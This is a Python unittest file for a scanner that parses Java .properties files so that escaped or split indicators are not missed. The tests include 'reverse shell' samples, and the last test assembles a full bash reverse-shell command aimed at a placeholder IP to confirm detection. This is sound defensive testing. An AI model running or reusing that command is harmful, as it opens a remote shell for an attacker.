"""Property escapes must not hide indicators; formats are parsed, not exempted."""
from pathlib import Path
import sys
import unittest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / 'scanner'))
import content_guard as content
from test_content_coverage import engine


class JavaPropertiesTests(unittest.TestCase):
    def inspect(self, raw, path='messages.properties', limit=100000):
        scanner = content.Inspector(engine=engine(), limits={**content.LIMITS, 'text_bytes': limit})
        scanner.content('lib.jar!' + path, raw)
        return scanner

    def test_latin1_is_parsed_without_excluding_any_content(self):
        raw = '# Übersetzung\nkey : größer\nempty\n'.encode('latin-1')
        text = content.java_properties_text(raw, 10000)
        self.assertIn('Übersetzung', text)
        self.assertIn('\nkey\ngrößer\nempty\n', text)
        scanner = self.inspect(raw)
        self.assertEqual(scanner.gaps, [])
        self.assertEqual(scanner.exclusions, [])
        self.assertEqual(scanner.files_scanned, 1)

    def test_unicode_escapes_keys_values_comments_and_overwritten_values_are_scanned(self):
        for raw in (b'key=rev\\u0065rse shell', b'rev\\u0065rse\\ shell=value',
                    b'# reverse shell\nkey=ok', b'key=reverse shell\nkey=ok',
                    b'key=re\\u200everse sh\\u200fell', b'key=rever\\se shell'):
            scanner = self.inspect(raw)
            self.assertEqual(scanner.gaps, [], raw)
            self.assertTrue(any(f['malware'] for f in scanner.findings), raw)

    def test_utf8_and_latin1_views_both_preserved_and_inspected(self):
        raw = 'name=Øæ😀\nkey=re\u200everse shell'.encode('utf-8')
        text = content.java_properties_text(raw, 10000)
        self.assertIn('Øæ😀', text)
        self.assertIn(raw.decode('latin-1'), text)
        scanner = self.inspect(raw)
        self.assertEqual(scanner.gaps, [])
        self.assertTrue(any(f['malware'] for f in scanner.findings))

    def test_valid_surrogate_pair_is_decoded_once(self):
        text = content.java_properties_text(b'key=\\ud83d\\ude00', 10000)
        self.assertTrue(text.endswith('\nkey\n😀'))
        text = content.java_properties_text(b'key=\\u005cu0061', 10000)
        self.assertTrue(text.endswith('\nkey\n\\u0061'))

    def test_continuations_all_line_endings_and_comment_rules(self):
        for ending in (b'\n', b'\r', b'\r\n'):
            raw = b'key=rev\\' + ending + b' \t\ferse sh\\' + ending + b'  ell'
            scanner = self.inspect(raw)
            self.assertEqual(scanner.gaps, [])
            self.assertTrue(any(f['malware'] for f in scanner.findings))
        text = content.java_properties_text(b'# comment\\\nkey=value\nother=one\\\n#two', 10000)
        self.assertTrue(text.endswith('\nkey\nvalue\nother\none#two'))

    def test_escaped_delimiters_whitespace_and_even_backslashes(self):
        raw = b'key\\ with\\:equal\\==value\\twith space\npath=C:\\\\\nnext=value'
        text = content.java_properties_text(raw, 10000)
        self.assertTrue(text.endswith('\nkey with:equal=\nvalue\twith space\npath\nC:\\\nnext\nvalue'), repr(text))

    def test_unknown_escapes_drop_only_the_backslash(self):
        raw = b'key=\\b\\z\\1\\"\\\''
        text = content.java_properties_text(raw, 10000)
        self.assertTrue(text.endswith('\nkey\nbz1"\''))

    def test_malformed_escape_surrogates_and_binary_controls_remain_gaps(self):
        for raw in (b'key=\\u123', b'key=\\uu1234', b'key=\\uXYZ1', b'key=\\ud800',
                    b'key=\\udfff', b'key=\\u0000', b'key=\\u0085', b'key=\\',
                    b'key=\0', b'key=\x1b', b'key=\x7f', b'key=\x85', b'key=\xc2\x85'):
            self.assertTrue(self.inspect(raw).gaps, raw)

    def test_size_budgets_cover_decoded_and_raw_views(self):
        for raw, limit in ((b'key=' + b'a' * 1000, 100), (b'key=abcdef', 15),
                           ('key=😀'.encode('utf-8'), 20)):
            self.assertTrue(self.inspect(raw, limit=limit).gaps)
        self.assertIsNone(content.java_properties_text(b'\n' * 100001, 1000000))

    def test_known_binary_magic_cannot_be_cleared_by_the_extension(self):
        for raw in (b'\x7fELF' + b'\0' * 100, b'\xca\xfe\xba\xbe' + b'\0' * 100):
            scanner = self.inspect(raw)
            self.assertTrue(any(g['reason'] == 'executable-binary-needs-independent-review'
                                for g in scanner.gaps))

    def test_encoding_scope_is_not_extended_to_unknown_binary_files(self):
        self.assertTrue(self.inspect(b'key=gr\xf6\xdfer', 'unknown.bin').gaps)
        scanner = self.inspect(b'key=rev\\u0065rse shell', 'messages.PROPERTIES')
        self.assertTrue(any(f['malware'] for f in scanner.findings))

    def test_real_source_rules_detect_fully_escaped_indicator(self):
        # Assemble inert tokens as in test_http_open's real-engine test.
        # Nothing is executed or connected to; no source rule is exempted.
        indicator = ' '.join(('bash', '-i', '>&', '/dev/tcp/192.0.2.1/1', '0>&1'))
        escaped = ''.join('\\u%04x' % ord(c) for c in indicator)
        raw = ('command=' + escaped).encode('ascii')
        scanner = content.Inspector(engine=content.load_engine())
        scanner.content('library.jar!settings.properties', raw)
        self.assertEqual(scanner.gaps, [])
        self.assertTrue(any(f['rule'] == 'shell-reverse-connection' and f['malware']
                            for f in scanner.findings))


if __name__ == '__main__':
    unittest.main()
